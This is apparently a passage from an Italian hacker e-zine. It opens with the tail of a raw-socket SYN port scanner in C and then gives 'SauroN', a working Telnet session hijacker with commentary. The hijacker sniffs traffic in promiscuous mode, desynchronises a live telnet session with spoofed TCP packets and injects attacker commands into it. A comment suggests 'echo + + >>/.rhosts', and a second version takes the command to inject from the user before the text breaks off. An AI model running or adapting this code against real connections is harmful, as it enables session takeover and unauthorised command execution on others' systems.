                                            (URG|ACK|PSH|FIN|RST|SYN);
                                infoz->datalen = ntohs(ip->tot_len) -
                                ((ip->verlen & 0xF) << 2) -
                                ((ntohs(tcp->offset_flag) & 0xF000) >> 10);
                                alarm(0);
                                return 0;
                        }
                }
            }
        }
    }
}


/*EHEHEHEH...qui iniziano le cose più carine! Come notate ho messo che è stato
preso da coder@reptile.Vediamo di parlarne un po'!
E' una funzione che si aspetta:
fd è il socket di ricezione(noi gli passiamo,come visto sopra, fd_recive)
*infoz è il puntatore alla struttura wait_packet che va a riempire i
campi della struttura.
wp_source e wp_source_port sono l'indirizzo e la porta di quello che trasmette
(da precisare: che trasmette verso di noi...quindi saranno IP e porta del
server scannato!)
wp_dest e wp_dest_port sono il nostro IP e porta.
wp_flag: beh...le flag del pacchetto!
wait_time: nulla che ci interessi.
Non mi sembra ci sia molto altro da dire...qui serve solo un po' di conoscenza
in C e il codice non è molto difficile!Leggetevelo per bene!*/


void trans_tcp (int sp_fd, char *sp_data,int sp_ipoptlen, int sp_tcpoptlen,
                int sp_datalen, char *sp_source, unsigned short sp_source_port,
                char *sp_dest, unsigned short sp_dest_port, unsigned long
                sp_seq, unsigned long sp_ack, unsigned short sp_flags)
{
        char sp_buffer[1500];
        char pseudoconstruct[MTU];
        struct pseudoIP *pseudo;
        struct TCPhdr *newtcp;
        struct IPhdr *newip;
        int shooten;
        struct sockaddr_in target;

        bzero(sp_buffer,1500);
        if (sp_datalen!=0)
        memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen,
        sp_data+sp_ipoptlen+sp_tcpoptlen,sp_datalen);

        newtcp=(struct TCPhdr *)(sp_buffer+IP_HEAD_BASE+sp_ipoptlen);
        pseudo=(struct pseudoIP *) pseudoconstruct;

        newtcp->offset_flag = htons( (((TCP_HEAD_BASE+sp_tcpoptlen)/4)<<12) | sp_flags);
        newtcp->seq = htonl(sp_seq);
        newtcp->ack_seq = htonl(sp_ack);
        newtcp->source = htons(sp_source_port);
        newtcp->dest = htons(sp_dest_port);
        newtcp->window = htons(0x7c00);

        pseudo->source = nameResolve(sp_source);
        pseudo->dest = nameResolve(sp_dest);
        pseudo->zero_byte = 0;
        pseudo->protocol = 6;
        pseudo->TCP_UDP_len = htons(sp_datalen+TCP_HEAD_BASE+sp_tcpoptlen);

        memcpy(pseudoconstruct+12, newtcp, sp_tcpoptlen+sp_datalen+TCP_HEAD_BASE);
        newtcp->checksum=in_cksum((unsigned short *) pseudoconstruct, sp_datalen +
        12 + TCP_HEAD_BASE + sp_tcpoptlen);

        newip = (struct IPhdr *) (sp_buffer);
        newip->checksum=0;
        newip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp_ipoptlen)/4);
        newip->type = 0;
        newip->tot_len = htons(IP_HEAD_BASE + TCP_HEAD_BASE + sp_datalen
                + sp_ipoptlen + sp_tcpoptlen);
        newip->ID = htons(12545);
        newip->flag_offset = 0;
        newip->TTL = 255;
        newip->protocol = IPPROTO_TCP;
        newip->saddr = nameResolve(sp_source);
        newip->daddr = nameResolve(sp_dest);
        newip->checksum=in_cksum((unsigned short *) (sp_buffer), IP_HEAD_BASE
                        + sp_ipoptlen);

        bzero((char *) &target, sizeof(struct sockaddr));
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = nameResolve(sp_dest);

        shooten = sendto(sp_fd, (char *)(sp_buffer), sp_datalen + TCP_HEAD_BASE
        + IP_HEAD_BASE + sp_ipoptlen, 0, (struct sockaddr *) &target,
                        sizeof(struct sockaddr));

}

/*Come sopra con la differenza che questa è la funzione che spedisce i nostri
pacchetti!
Spiego alcuni campi:
il primo è il socket che manda i pacchetti.
sp_data: IP e TCP option da trasmettere(NULL per non trasmettere nulla)
sp_ipoptlen: lunghezza dell'IP option(per noi sarà 0)
sp_tcpoptlen: come sopra ma del TCP.
sp_source: il nostro IP
sp_source_port: la nostra porta(io ho messo 5000 di default,cambiatela se volete!)
sp_dest: indirizzo del server
sp_dest_port: porta del server
sp_seq: seq del pacchetto
sp_ack: chissà cos'è?:-)))
sp_flags: quella che per noi sarà sampre SYN
Anche qui leggetevi il codice...come funzionano i puntatori -> l'ho spiegato nella
parte teorica, quindi dovreste capire tutto! Divertitevi!:-D*/

int sniff_pk
(int sniff_fd, char *buffer, int *tcpstart, char *proto)
{
        struct IPhdr    *IP;
        char    sniff_buffer[1500];
        int pack_len;

        pack_len = read(sniff_fd, sniff_buffer, MTU);
        if (read > 0) {
                pack_len -=DEV_PREFIX;
                memcpy(buffer, sniff_buffer+DEV_PREFIX, pack_len);
                IP = (struct IPhdr *)buffer;
                if (proto != NULL) *proto = IP->protocol ;
                if(tcpstart != NULL)
                *tcpstart = (IP->verlen & 0xF) << 2;
        }
        return pack_len;
}

/*Anche questa è già tutta spiegata perchè stava alla base del mio piccolo sniffer!
Riguardatevi TCP/IP tut parte 2...è tutto lì!*/


int main(int argc, char *argv[])
{
int i,j,count, porta,iport,fport;
char CLIENT[100], SERVER[100] ;
int CLIENT_P ;
struct wait_packet attack_info;
u_long sp_seq;

if (argc!=5)  {        printf("\n\t|*********************************************************|");
                        printf("\n\t|   - SYN PortScan-           by City Hunter            |\n");
                        printf("\t|++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|\n");
                        printf("\t|    %s  Source  Target <initial port><final port>         |\n", argv[0]);
                        printf("\t|**********************************************************|\n\n");

               exit(0);

	       }

	strcpy(CLIENT, argv[1]);
	strcpy(SERVER, argv[2]);
	CLIENT_P=5000;
	iport=atoi(argv[3]);
	fport=atoi(argv[4]);
	sp_seq=1118358509;

	DEV_PREFIX = INTERFACE_PREFIX ;
        if ((fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0 ) {
                perror("Non riesco ad aprire il RAW S0CKETS ");
                exit(1);
        }
        fd_recive = if_init(INTERFACE);

for (porta=iport; porta<=fport; porta++)
{
	trans_tcp(fd_send,NULL,0,0,0,CLIENT,CLIENT_P,SERVER,porta,sp_seq,0,SYN);


	wait_pk(fd_recive,&attack_info,SERVER,porta,CLIENT,CLIENT_P,SYN|ACK,0);

	 if(attack_info.seq != 0) printf("%d porta aperta\n",porta);
	}


		exit(0);

}

/*Qui ho usato lo stesso meccanismo dell'altra volta...un ciclo for.
In sostanza cosa fa? Mando il mio pacchetto con flag SYN e seq 1118358509(potete
metterlo a vostro piacimento...più o meno) e aspetto che il server mi risponda.
Se la porta a cui ho spedito il mio pacchetto RSTta la connessione è perchè
la porta è chiusa. Se invece risponde con un pacchetto con flag SYN|ACK
e un seq diverso da 0(non so quant'è...dovrei prevederlo...ma qui non ci interessa,
basta sia =! da 0) allora la porta è aperta e,come detto sopra, ci pensa il nostro
kernellino a chiudere la connessione per noi!
Carino non vi pare?:-) Anche qui mancano tante cosucce che lascio per vostro diletto
personale! Se uno ha tempo e vuole scrivermi la funzione per leggere da /etc/services
il servizio delle porte la accetto volentieri!Il costrutto case è poco
elegante:-)))*/

----[Saluti]----

Ricolgo l'occasione per fare i più vivi e sinceri auguri di buon Natale a tutti,
in particolar modo alla crew NoFlyZone e agli amici di OndaQaudra.
Saluto in particolare: Vicio, Crashes, XpTerminator, Delilah, Zuccherina83,
Pit,Jeyone, Vlad, anetrip, BIGA, Marsio...e poi non mi ricordo!:-)
Approfittate gente per studiare in queste vacanze, mi raccomando!

------------------------------------*END*--------------------------------------

-------------------------------------[40]--------------------------------------
---------------------------------[CityHunter]----------------------------------
--------------------------[SauroN: the Telnet Hijacker]------------------------
-------------------[Spoofing Vedente: First Implementation]--------------------

Hola a tutti!Eccoci qui...mi davate x disperso eh?:)Tranquilli...è che sotto
esami non ho molto tempo!X questo vi propongo qui oggi un piccolo tool,nulla
di speciale,ma che cmq vi sarà molto utile,se non altro x lo studio del codice!
Faccio subito un piccolo Disclaimer:NON è nulla di NUOVO! Già FuSyS l'ha fatto
e già lui si è ispirato a Coder@reptile! Non rompetemi le palle dicendo che ho
rippato,ok?Il meccanismo E' questo...non possono essere tanto diversi ok?
Bene...non starò qui a spiegarvi tanto cosa fa...anzi,x nulla!=)
Qui DOVETE leggervi il codice,e capirete!
Metto le spiegazioni direttamente nel codice,ok?:)
Buono studio!

TUTTO IL MATERIALE CONTENUTO NEL TUTORIAL  E' DA RITENERSI A PURO SCOPO
INFORMATIVO E LUDICO. L' AUTORE  NON SI RITIENE IN ALCUN MODO RESPONSABILI PER
DANNI CAUSATI DALL'USO DI PROGRAMMI E CODICE.


----[Telnet Hijacker]-----


/* Nulla di nuovo sotto il sole,leggetevelo e capite:) Mando un grosso saluto
a tutta la crew NoFlyZone e ringrazio tutti quelli che sono intervenuti al meeting!
Vi aspetto al prox(appena finisco gli esami)!
Ringrazio e saluto anche: Pit,XpTerminator,Deli,Zukky,Ike,SHNYPER(scritto giusto?)
MARSIO,Xanthic',Click...e tutti quelli vedrò giovedì all'InfoSecurity(spero...)
Beh...chiaramente Lui:FuSyS:)) See Ya! */



#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <curses.h>
#include <netinet/in.h>
#include <linux/ip.h>     /*include dove sono definite le strutture dell'ip...*/
#include <linux/if.h>	  /*controllo dell'interfaccia...vedi più avanti*/
#include <sys/ioctl.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>

#define MTU                     1500
#define IP_VERSION              4	/*almeno x un po' ancora:)*/
#define IP_HEAD_BASE            20
#define TCP_HEAD_BASE           20
#define INTERFACE               "eth0"   /*se volete usare ppp mettete "ppp0"*/
#define INTERFACE_PREFIX        14        /*sempre per ppp mettete 0*/
#define MY_COUNT                60	/*normale contatore...vedere il main x capire*/
#define URG                     32      /*da URG a FIN sono le TCP flags...dovreste saperlo no?*/
#define ACK                     16
#define PSH                     8
#define RST                     4
#define SYN                     2
#define FIN                     1

int DEV_PREFIX; /*serve x l'interfaccia che useremo,in questo caso eth!*/
		/*è la lunghezza in byte dell'header chiamato con SOCKET_PACKET*/
		/*dovrà concordare con il valore dell'interfaccia che usiamo(vedere main)*/
sig_atomic_t WAIT_PACKET_WAIT_TIME = 0;
int fd_rec, fd_send; /*socket in ricezione e in spedizione*/


/* Iniziamo con le nostre belle strutture */

struct wait_packet
{
        unsigned long seq,ack;
        unsigned short flags;
        unsigned short source_p,dest_p;
        int datalen;
};

struct IPhdr
{
        unsigned char verlen, type;     /*versione-lunghezza dell'header,tipo*/
        unsigned short tot_len, ID, flag_offset;       /*lunghezza, id, flags+offset*/
        unsigned char TTL, protocol;    /*time to live, e il protocollo utilizzato*/
        unsigned short checksum;	/*mah...cosa sarà mai?:)))*/
        unsigned long int saddr, daddr;  /*indirizzo ip sorgente, ip destinazione*/
};

struct TCPhdr
{
        unsigned short source, dest;
        unsigned long int seq, ack_seq;		/*non ho voglia di spiegarvelo...lo sapete anche voi!*/
        unsigned short offset_flag, window, checksum, urgent;
};

struct pseudoIP
{
        unsigned long int source, dest;
        char zero_byte, protocol;
        unsigned short TCP_UDP_len;
};

int if_init(char *device)	/*questa parte è il controllo degli errori*/
				/*x accedere alla struct ifreq abbiamo dovuto mettere/*
				/*#include<linux/if.h>...vedetevelo,non fa mai male!*/
{
	int if_fd;
	struct ifreq netif;
	char test;
	if ((if_fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1) {
        	perror("Can't Open PACKET SOCKET.");
		exit(1);	/*ricordate nel meeting?Questa è la chiamata a sock_packet*/
				/*che ci permette di vedere i pacchetti a livello datalink*/
	}
	strcpy(netif.ifr_ifrn.ifrn_name,device);
	if(ioctl(if_fd,SIOCGIFFLAGS,&netif)<0) {
        	perror("Can't Get Interface Flags.");
		exit(1);
	}
	netif.ifr_ifru.ifru_flags |= IFF_PROMISC;
	if(ioctl(if_fd,SIOCSIFFLAGS,&netif)<0) {
        	perror("Can't Set Interface Flag. (PROMISC)");
		exit(1);/*interfaccia in modalità promiscua...vi serve x leggere i pacchetti non*/
			/*destinati alla vostra macchina(riguardarsi la teoria)*/
	}
	if(fcntl(if_fd,F_SETOWN,getpid())<0) {
        	perror("Can't Set PACKET Ownership");
		exit(1);/*siete root vero sulla macchina?=;-)*/
	}
	return if_fd;
}

void ethclose()  /*funzione che mette l'eth in modalità promiscua(chiaramente usa l'ioctl*/
		/*input/output controller)*/
{
        struct ifreq eth;
        strcpy(eth.ifr_ifrn.ifrn_name, INTERFACE);
        if ( ioctl(fd_rec, SIOCGIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't get Ethernet flags.\n");
                exit(1);
        }
        eth.ifr_ifru.ifru_flags ^= IFF_PROMISC ;
        if ( ioctl(fd_rec, SIOCSIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't put Ethernet in PROMISC mode.\n");
                exit(1);
        }
	exit(0);
}


unsigned short in_cksum(unsigned short *addr,int len)
{
        register long sum = 0;            /* assumes long == 32 bits */
        register unsigned short *w = addr;
        unsigned short answer = 0;         /* assumes u_short == 16 bits */
        register int nleft = len;;

        /*
        * Our algorithm is simple, using a 32-bit accumulator (sum),
        * we add sequential 16-bit words to it, and at the end, fold back
        * all the carry bits from the top 16 bits into the lower 16 bits.
        */

        while (nleft > 1)
        {                                /* per tutta la funzione:il checksum viene calcolato solo sull'header IP,non sui dati che trasmette*/
        sum += *w++;                   /*per la creazione di pacchetti quali IP,UDP ecc dobbiamo calcolare*/
                                         /* il checksum...si fa con la funzione*/
        nleft -= 2;                     /*rippata dal codice di ping.c:-)))*/
        }

                /* mop up an odd byte, if necessary */
        if (nleft == 1)
        {
        *(u_char *) (&answer) = *(u_char *)w;   /* one byte only */
        sum += answer;
        }

        /*
        * Add back carry outs from top 16 bits to low 16 bits.
        */

        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits */

        return(answer);
}

unsigned long nameResolve(char *hostname)
{
        struct in_addr addr;
        struct hostent *hostEnt;

        if((addr.s_addr=inet_addr(hostname)) == -1)                      /*qui chiaramente fa il controllo sull'esistenza o meno del server*/
        {
        if(!(hostEnt=gethostbyname(hostname)))
        {
                fprintf(stderr,"Unknown host:`%s`\n",hostname);
                exit(0);
        }
        bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
        }
        return addr.s_addr;
}


/* from Spoofit by coder@reptile */
void wait_packet_timeout (int sig)
{
alarm(0);
WAIT_PACKET_WAIT_TIME=1;
}

/*questa sotto è la funzione che sniffa i pacchetti che arrivano alla vostra macchina*/
/*dovreste ormai ritrovarvi con codice...riguardatevi il mio piccolo sniffer e la*/
/*teoria sui puntatori...non è difficile*/
int wait_pk(int fd,struct wait_packet *infoz,                         /* fd è un socket di ricezione*/
                char *wp_source, unsigned short wp_source_port,       /* wp_source e wp_source_port sono coloro che mandano il pacchetto*/
                char *wp_dest, unsigned short wp_dest_port, int wp_flags,    /*i due wp qui sono i riceventi*/
                int wait_time)
{
        char wp_buffer[1500];
        struct IPhdr *ip;
        struct TCPhdr *tcp;
        unsigned long sourcel, destl;
        int tcpstart;
        char proto;

        sourcel = nameResolve(wp_source);
        destl = nameResolve(wp_dest);

        WAIT_PACKET_WAIT_TIME=0;
        if(wait_time!=0) {
                signal(SIGALRM,wait_packet_timeout);
                alarm(wait_time);
        }

        while(1) {
                while(sniff_pk(fd, wp_buffer, &tcpstart, &proto)<=0) {
                        if (WAIT_PACKET_WAIT_TIME!=0) {
                                alarm(0);
                                return -1;
                        }
                };
           if(proto == 6) {
                ip= (struct IPhdr *) wp_buffer;
                tcp= (struct TCPhdr *) (wp_buffer+tcpstart);
                if((sourcel==ip->saddr) && (destl==ip->daddr)) {
                  if(((ntohs(tcp->source)==wp_source_port)
                     || (wp_source_port==0)) &&
                       ((ntohs(tcp->dest)==wp_dest_port)
                        || (wp_dest_port==0))) {
                        if( (wp_flags==0) || (ntohs(tcp->offset_flag)&wp_flags))
                        {
                                infoz->source_p=ntohs(tcp->source);
                                infoz->dest_p=ntohs(tcp->dest);
                                infoz->seq=ntohl(tcp->seq);
                                infoz->ack=ntohl(tcp->ack_seq);
                                infoz->flags=ntohs(tcp->offset_flag)&
                                            (URG|ACK|PSH|FIN|RST|SYN);
                                infoz->datalen = ntohs(ip->tot_len) -
                                ((ip->verlen & 0xF) << 2) -
                                ((ntohs(tcp->offset_flag) & 0xF000) >> 10);
                                alarm(0);
                                return 0;
                        }
                }
            }
        }
    }
}


/*funzione di trasmissione:nulla di complesso...in sostanza creo il pacchetto TCP/IP*/
/*adatto ai miei scopi e tramite sendto lo spedisco a destinazione*/
void trans_tcp (int sp_fd, char *sp_data,int sp_ipoptlen, int sp_tcpoptlen,
                int sp_datalen, char *sp_source, unsigned short sp_source_port,
                char *sp_dest, unsigned short sp_dest_port, unsigned long
                sp_seq, unsigned long sp_ack, unsigned short sp_flags)
{
        char sp_buffer[1500];
        char pseudoconstruct[MTU];
        struct pseudoIP *pseudo;
        struct TCPhdr *newtcp;
        struct IPhdr *newip;
        int shooten;
        struct sockaddr_in target;

        bzero(sp_buffer,1500);/*bzero setta tutti i 1500 bytes del buffer a zero*/
				/*beh...più comodo del ciclo for,no?:)*/
        if (sp_datalen!=0)
        memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen,
        sp_data+sp_ipoptlen+sp_tcpoptlen,sp_datalen);
	/*copia i bytes di sp_datalen da sp_data+sp_ipoptlen+sp_tcpoptlen a*/
	/*sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen*/

        newtcp=(struct TCPhdr *)(sp_buffer+IP_HEAD_BASE+sp_ipoptlen);
        pseudo=(struct pseudoIP *) pseudoconstruct;

        newtcp->offset_flag = htons( (((TCP_HEAD_BASE+sp_tcpoptlen)/4)<<12) | sp_flags);
        newtcp->seq = htonl(sp_seq);
        newtcp->ack_seq = htonl(sp_ack);
        newtcp->source = htons(sp_source_port);
        newtcp->dest = htons(sp_dest_port);
        newtcp->window = htons(0x7c00);

        pseudo->source = nameResolve(sp_source);
        pseudo->dest = nameResolve(sp_dest);
        pseudo->zero_byte = 0;
        pseudo->protocol = 6;
        pseudo->TCP_UDP_len = htons(sp_datalen+TCP_HEAD_BASE+sp_tcpoptlen);

        memcpy(pseudoconstruct+12, newtcp, sp_tcpoptlen+sp_datalen+TCP_HEAD_BASE);
        newtcp->checksum=in_cksum((unsigned short *) pseudoconstruct, sp_datalen +
        12 + TCP_HEAD_BASE + sp_tcpoptlen);

        newip = (struct IPhdr *) (sp_buffer);
        newip->checksum=0;
        newip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp_ipoptlen)/4);
        newip->type = 0;
        newip->tot_len = htons(IP_HEAD_BASE + TCP_HEAD_BASE + sp_datalen
                + sp_ipoptlen + sp_tcpoptlen);
        newip->ID = htons(12545);
        newip->flag_offset = 0;
        newip->TTL = 255;
        newip->protocol = IPPROTO_TCP;
        newip->saddr = nameResolve(sp_source);
        newip->daddr = nameResolve(sp_dest);
        newip->checksum=in_cksum((unsigned short *) (sp_buffer), IP_HEAD_BASE
                        + sp_ipoptlen);

        bzero((char *) &target, sizeof(struct sockaddr));
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = nameResolve(sp_dest);

        shooten = sendto(sp_fd, (char *)(sp_buffer), sp_datalen + TCP_HEAD_BASE
        + IP_HEAD_BASE + sp_ipoptlen, 0, (struct sockaddr *) &target,
                        sizeof(struct sockaddr));
	/*guardarsi man sendto,thx!:)*/

}


/*funzione identica a quella dello sniffer...creiamo il nostro buffer e via:)*/
int sniff_pk
(int sniff_fd, char *buffer, int *tcpstart, char *proto)
{
        struct IPhdr    *IP;
        char    sniff_buffer[1500];
        int pack_len;

        pack_len = read(sniff_fd, sniff_buffer, MTU);
        if (read > 0) {
                pack_len -=DEV_PREFIX;
                memcpy(buffer, sniff_buffer+DEV_PREFIX, pack_len);
                IP = (struct IPhdr *)buffer;
                if (proto != NULL) *proto = IP->protocol ;
                if(tcpstart != NULL)
                *tcpstart = (IP->verlen & 0xF) << 2;
        }
        return pack_len;
}


/*ok...tutto quello che c'era lì sopra è contenuta nel bellissimo spoofit.h di coder@reptile!*/
/*avrei anche fatto prima a mettere l'include...ma così pochi se lo sarebbero letto e */
/*avrebbero realmente capito!*/


int main(int argc, char *argv[])
{
        int h,k,cont;
        char CLIENT[100], SERVER[100] ;
        int CLIENT_PORT ;
        struct wait_packet pk_info;
        unsigned long spoof_seq, spoof_ack;
        unsigned long old_seq, old_ack;
        unsigned long serv_seq, serv_ack;

        char cleaner[]={0x08,0x08,0x08,0x08,0x08,0x08,0x0a,0x0a};       /*sono i dati che ci servono per pulire*/
                                                                        /*la linea della shell...dove poi mettiamo i nostri dati!*/

        char evil_data[]="echo "SESSION HACKED BY CITY HUNTER!Pay attention next time!!" >>profile";
        /*la riga sopra è quella fondamentale per i nostri loschi scopi!Provate a fare qualcosa di simile a "echo + + >>/.rhosts"*/
        /*lo fece un tipo di nome Mitnick...qualcosa di simile:-)))(ha usato lo spoofing cieco lui)*/
                if(argc!=4)
                        {
                        printf("\n\t|**************************************************|");
                        printf("\n\t|  SauroN  -Telnet Hijacker V0.1-  by City Hunter  |\n");
                        printf("\t|++++++++++++++++++++++++++++++++++++++++++++++++++|\n");
                        printf("\t|    %s  CLiENT H0ST  TCP P0RT  TARGET       |\n", argv[0]);
                        printf("\t|**************************************************|\n\n");
                        exit(1);
        }
        strcpy(CLIENT, argv[1]);
        strcpy(SERVER, argv[3]);
        CLIENT_PORT=atoi(argv[2]);

        DEV_PREFIX = INTERFACE_PREFIX ;
        if ((fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0 ) {
                perror("Non riesco ad aprire il RAW S0CKETS ");
                exit(1);
        }
        fd_rec = if_init(INTERFACE);
        printf("\n\t|************************************************|");
        printf("\n\t| SauroN    -Telnet Hijacker-     by City Hunter |\n");
        printf("\t|++++++++++++++++++++++++++++++++++++++++++++++++|\n");
        printf("\t|          (si dia inizio alle danze!:-))        |\n");
        printf("\t|************************************************|\n\n");


        for (h=0;h<50;h++) {
                printf(">-------------------------------->\n");
                printf(" STEP  #1 : TELNET Sniff'n'Desync \n");
                printf("<--------------------------------<\n");

                wait_pk(fd_rec, &pk_info, CLIENT, CLIENT_PORT, SERVER,
                        23, ACK|PSH,0);
                spoof_seq=pk_info.seq + pk_info.datalen;
                spoof_ack=pk_info.ack;
                printf("\nCCCII   Sto sniffando la connessione   TTTYY\n");
                printf("%s:%i > %s:23 SEQ:%X (hex) ACK:%X (hex)\n", CLIENT,
                        CLIENT_PORT, SERVER, pk_info.seq, pk_info.ack);
                printf("\nHUN Sp00fing to Desync TER\n");
                printf("Sending TCP packet with SEQ %X ACK %X FLAGS:ACK|PSH",
                        spoof_seq, spoof_ack);
                trans_tcp(fd_send, cleaner, 0, 0, sizeof(cleaner), CLIENT,
                CLIENT_PORT, SERVER, 23, spoof_seq, spoof_ack, ACK|PSH);
                cont = 0;
                printf("\n\n>LO Waiting f0r Desync_C0nfirm VE<\n");
                while (cont<5) {
                        wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT,
                                CLIENT_PORT, ACK,0);
                        if(pk_info.ack==spoof_seq + sizeof(cleaner))
                                cont=MY_COUNT;
                        else cont++;
                }
                if(cont!=MY_COUNT) {
                        printf("\t<--------------------------------->\n");
                        printf("\t STEP  #1 N0T SUCCEDED ... L00PiNG\n");
                        printf("\t<--------------------------------->\n");
                }
                else {
                        printf("### Step #1 0K. ###\n");
                        printf(">>> YEAHHHHHHH  <<<\n");
                        break;
                }
        }

        printf("\n<------------------------------------<\n");
        printf(" STEP  #2 - GETTING SYN/ACK 0NCE M0RE\n");
        printf(">------------------------------------>\n");
        cont = serv_seq = old_ack = 0;
        while(cont<10) {
                old_seq = serv_seq;
                old_ack = serv_ack;
                wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
                        ACK,0);
                if (pk_info.datalen == 0) {
                        serv_seq=pk_info.seq + pk_info.datalen;
                        serv_ack=pk_info.ack;
                        if ((old_seq==serv_seq)&&(serv_ack==old_ack))
                                cont = MY_COUNT;
                        else cont++;
                }
        }
        if(cont!=MY_COUNT) {
                printf("\t<-------------------------------->\n");
                printf("\t STEP  #2 NOT SUCCEDED. SHIT!!! \n");
                printf("\t<-------------------------------->\n");
                exit(0);
        }
        printf("Server SEQ: %X (hex)\tACK: %X (hex)\n", serv_seq, serv_ack);
        printf(">HA Step  #2 0K. CK<\n");

        printf("\n<----------------------------------------------------<\n");
        printf("                 STEP  #3 - SENDING 0UR DATA            \n");
        printf(">---------------------------------------------------->\n");
        printf(">>> HIHIHIHI Injecting Evil Data in the connection <<<\n");
        trans_tcp(fd_send, evil_data, 0, 0,sizeof(evil_data), CLIENT, CLIENT_PORT,
                SERVER, 23, serv_ack, serv_seq, ACK|PSH);
        cont=0;
        printf("\n>>> Waiting for Confirm <<<\n");
        while(cont<5) {
                wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
                        ACK,0);
                if(pk_info.ack==serv_ack+sizeof(evil_data))
                        cont=MY_COUNT;
                else cont++;
        }
        if (cont!=MY_COUNT) {
                printf("\t<--------------------->\n");
                printf("\t STEP #3 N0T SUCCEDED\n");
                printf("\t<--------------------->\n\n");
                exit(0);
        }
        printf("*** STEP  #3 0K ***\n\n");
        printf(" >>> Great Hijacking :-)) <<< \n");
        printf(" <<< SEE YA GUYS  <<<\n");
        exit(0);
}


---------------------------------------tagli qui-------------------------------

Ok...qui spiego un po' il main! Cosa facciamo? Prima cosa sniffiamo la connessione
in corso tra 2 computer...e inseriamo pochi nostri dati (cleaner) x desincronizzare
i due(vedere meeting). Ora il client resta in Fin_wait finchè il kernel non
cestina la connessione, e noi impersoniamo lui visto che possiamo tranquillamente
sniffare i corretti SEQ e ACK! Così,dopo aver pulito la shell, risniffiamo i dati
e,se tutto è andato bene, inseriamo i nostri evil_data:)sotto mentite
spoglie chiaramente:)Missione compiuta! Migliorie ce ne sono molte...invio
interattivo dei comandi x esempio(un semplice strcpy potrebbe bastare!).
Io vi lascio solo questo perchè ora ho altre cose in mente da sviluppare...se
create qualcosa di simpatico mandatemelo!Al solito,mi trovate in #noflyzone,
#hack,#hackmaniaci,#hacersvault,#ahccc:)
Byezzzzzzzz

<<<<<<<<<<<<<<<<<HacK tHE PlanEt>>>>>>>>>>>>>>>>>>


Diario del capitano: Data astrale 23/1/2002

Come non detto...è passato un giorno e mi sono rimesso a pacioccarlo:)
Vi allego un secondo main in cui potete inviare i cmd interattivamente...metterli
cioè durante l'esecuzione del programma e non nel codice come nel precedente.
Non ho una LAN attualmente a disposizione su cui provare le modifiche...in teoria
dovrebbe andare,se qualcuno lo provasse e vedesse dei bug è pregato di correggerli
o quanto meno di segnalarmeli!Grazie!


int main(int argc, char *argv[])
{
        int h,k,cont;
        char CLIENT[100], SERVER[100] ;
        int CLIENT_PORT ;
        struct wait_packet pk_info;
        unsigned long spoof_seq, spoof_ack;
        unsigned long old_seq, old_ack;
        unsigned long serv_seq, serv_ack;

        char cleaner[]={0x08,0x08,0x08,0x08,0x08,0x08,0x0a,0x0a};       /*sono i dati che ci servono per pulire*/
                                                                        /*la linea della shell...dove poi mettiamo i nostri dati!*/

        char evil_data[100]; /* esempio di cmd: echo "ciao" >>root/profile */
	memset(evil_data,0,100); /*simile alla funz bzero...man memset */
		if(argc!=5)
                        {
                        printf("\n\t|**************************************************|");
                        printf("\n\t|  SauroN  -Telnet Hijacker V0.2-  by City Hunter  |\n");
                        printf("\t|++++++++++++++++++++++++++++++++++++++++++++++++++|\n");
                        printf("\t|    %s  CLiENT H0ST  TCP P0RT  TARGET       |\n", argv[0]       );
                        printf("\t|**************************************************|\n");
			printf("\t|             InSErt CmD to InJeCT                 |\n");
			printf("\t|**************************************************|\n\n");
                        exit(1);
        }
        strcpy(CLIENT, argv[1]);
        strcpy(SERVER, argv[3]);
        CLIENT_PORT=atoi(argv[2]);
	strcpy(evil_data,argv[4]);
	strcat(evil_data,"\n");

        DEV_PREFIX = INTERFACE_PREFIX ;
        if ((fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0 ) {
                perror("Non riesco ad aprire il RAW S0CKETS ");
                exit(1);
        }
        fd_rec = if_init(INTERFACE);
        printf("\n\t|************************************************|");
        printf("\n\t| SauroN    -Telnet Hijacker-     by City Hunter |\n");
        printf("\t|++++++++++++++++++++++++++++++++++++++++++++++++|\n");
        printf("\t|          (si dia inizio alle danze!:-))        |\n");
        printf("\t|************************************************|\n\n");


        for (h=0;h<50;h++) {
                printf(">-------------------------------->\n");
                printf(" STEP  #1 : TELNET Sniff'n'Desync \n");
                printf("<--------------------------------<\n");

                wait_pk(fd_rec, &pk_info, CLIENT, CLIENT_PORT, SERVER,
                        23, ACK|PSH,0);
                spoof_seq=pk_info.seq + pk_info.datalen;
                spoof_ack=pk_info.ack;
                printf("\nCCCII   Sto sniffando la connessione   TTTYY\n");
                printf("%s:%i > %s:23 SEQ:%X (hex) ACK:%X (hex)\n", CLIENT,
                        CLIENT_PORT, SERVER, pk_info.seq, pk_info.ack);
                printf("\nHUN Sp00fing to Desync TER\n");
                printf("Sending TCP packet with SEQ %X ACK %X FLAGS:ACK|PSH",
                        spoof_seq, spoof_ack);
                trans_tcp(fd_send, cleaner, 0, 0, sizeof(cleaner), CLIENT,
                CLIENT_PORT, SERVER, 23, spoof_seq, spoof_ack, ACK|PSH);
                cont = 0;
                printf("\n\n>LO Waiting f0r Desync_C0nfirm VE<\n");
                while (cont<5) {
